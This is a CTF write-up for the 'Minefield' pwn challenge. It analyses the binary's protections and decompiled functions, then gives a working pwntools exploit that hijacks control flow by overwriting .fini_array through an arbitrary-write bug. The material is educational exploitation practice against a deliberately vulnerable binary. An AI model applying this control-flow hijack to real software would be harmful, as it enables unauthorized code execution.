--- 
layout: post 
title:  "[CA HTB] Minefield"
date: "2021-04-25" 
categories: Pwn 
author: eurus 
---

I didn't solve this challenge in the race, but I only understood how to solve it after reading a writeup and understanding how the ``` .fini ``` and the ``` .fini_array ``` work.

This challenge is very easy but you need to know what are the sections  ``` .fini ``` and ``` .fini_array ```.


```bash
In [1]: from pwn import *

In [2]: context.binary = elf = ELF('./minefield')
[*] '/home/eurus/Documents/minefield/minefield'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
We can see here the protection enabled in this elf. Important for this challege are No RELRO and No PIE.

We can start to analyze what the program does:

```bash
┌──(eurus㉿ctf)-[~/Documents/minefield]
└─$ ./minefield 
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert type of mine: 2
Insert location to plant: 3
We need to get out of here as soon as possible. Run!
zsh: segmentation fault  ./minefield
```
So we have two user input if we respond at the first question that we are ready to plat a mine. And after that we give this input we have a segmentation fault.

Analyzing this elf with a disassembler we can see that we have a function called ``` _ ``` that cat the flag from the server, so we dont neeto to spawn a shell but we need just to redirect the flow of the program to this function.

```c
unsigned __int64 _(){
  size_t s_len; // rax
  unsigned __int64 canary; // [rsp+8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  s_len = strlen(aMissionAccompl);
  write(1, aMissionAccompl, s_len);
  system("cat flag*");
  return __readfsqword(0x28u) ^ canary;
}
```

In the program there are a funtion interesting. This id the ``` mission ``` function. It take 2 input (type of mine and location plant), it use ``` strtoull ``` The strtoul() function converts the initial part of the string in nptr to an unsigned long int value according to the given base, which must be between 2 and 36 inclusive, or be the special value 0. So this funtion convert the value of the sting into ull value. 

We can see that our input is taken by the r function, this function read from stdin only 9 bytes into nptr and so this mean that our input is only 9 char

```c
unsigned __int64 mission(){
  _QWORD *v1; // [rsp+0h] [rbp-30h]
  char nptr[10]; // [rsp+14h] [rbp-1Ch] BYREF
  char v3[10]; // [rsp+1Eh] [rbp-12h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  printf("Insert type of mine: ");
  r(nptr);
  ptr_write = (_QWORD *)strtoull(nptr, 0LL, 0);
  printf("Insert location to plant: ");
  r(value_write);
  puts("We need to get out of here as soon as possible. Run!");
  *ptr_write = strtoull(value_write, 0LL, 0);
  return __readfsqword(0x28u) ^ canary;
}

unsigned __int64 __fastcall r(void *nptr){
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  read(0, nptr, 9uLL);
  return __readfsqword(0x28u) ^ canary;
}

```


So the mission function do this:
1. take 9 char as input 
2. convert this input into a value ull named ``` ptr_write ```
3. take another input of 9 char as imput
4. convert this input into a value ull named ``` value_write ```
5. finally writes ``` value_write ``` inside the memory at address ``` ptr_write ```

**So we can write in any position of the program what we want... at least seems**

My first thing was owerwrite the GOT for ``` __stack_chk_fail ``` with the address of ``` _ ``` and attemp to modify the canary in order to call the function ``` __stack_chk_fail ``` but we cannot modify the canary, the read are *safe* as far as this program can be described as safe!

Second thought: overwrite the return address in the stack that we knoe because PIE is disabled, BUT ``` rip ``` is located on ``` 0x7fffffffdf78 ``` address inside mission function and we can insert only 9 characters so It's impossible. 

Here i was stuck. But then reading the solution I learned something new. 

```bash
.init	00000000004006C0	00000000004006D7	R	.	X	.	L	dword	0004	public	CODE	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	000F	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.init_array	0000000000601070	0000000000601078	R	W	.	.	L	qword	000B	public	DATA	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	000F	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.fini	0000000000400CA4	0000000000400CAD	R	.	X	.	L	dword	0007	public	CODE	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	000F	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.fini_array	0000000000601078	0000000000601080	R	W	.	.	L	qword	000C	public	DATA	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	000F	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
```

inside the binary we have this two segment. 
>The .init and .fini sections have a special purpose. If a function is placed in the .init section, the system will execute it before the main function. Also the functions placed in the .fini section will be executed by the system after the main function returns.

SO we can overwrite the ``` .fini_aray ``` with the address of the function ``` _ ``` and when pte program return correctly it will execute our function! lets see

```bash
In [24]: p = elf.process()
[x] Starting local process '/home/eurus/Documents/minefield/minefield'
[+] Starting local process '/home/eurus/Documents/minefield/minefield': pid 2046

In [25]: p.sendline('2')

In [26]: p.recvuntil(': ')
Out[26]: b'Are you ready to plant the mine?\n1. No.\n2. Yes, I am ready.\n> We are ready to proceed then!\nInsert type of mine: '

In [27]: p.sendline(str(fini_arr))

In [28]: p.recvuntil(': ')
Out[28]: b'Insert location to plant: '

In [29]: p.sendline(str(hex(elf.sym['_'])))

In [30]: p.interactive()
[*] Switching to interactive mode
[*] Process '/home/eurus/Documents/minefield/minefield' stopped with exit code 0 (pid 2046)
We need to get out of here as soon as possible. Run!

Mission accomplished! ✔
HACKAPPATOI{4n0th3r_fl4g} 
[*] Got EOF while reading in interactive

```

and this is the script.

```python
from pwn import *

context.binary = elf = ELF('./minefield')

p = elf.process()

fini_arr = 0x601078

p.sendline('2')
p.recvuntil(': ')
p.sendline(str(fini_arr))
p.recvuntil(': ')
p.sendline(str(hex(elf.sym['_'])))
res = p.recvall()
log.info(str(res).split('\\n')[-2])
```



